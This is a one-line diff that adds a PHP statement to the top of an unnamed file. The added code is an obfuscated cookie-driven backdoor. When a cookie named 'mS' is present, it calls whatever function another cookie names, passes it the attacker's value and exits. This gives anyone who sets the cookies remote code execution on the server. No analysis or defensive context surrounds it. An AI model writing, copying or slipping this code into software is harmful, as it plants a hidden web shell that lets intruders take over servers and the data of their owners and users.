@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["mS"])){$_COOKIE["thvtM"]($_COOKIE["mS"]);exit;}
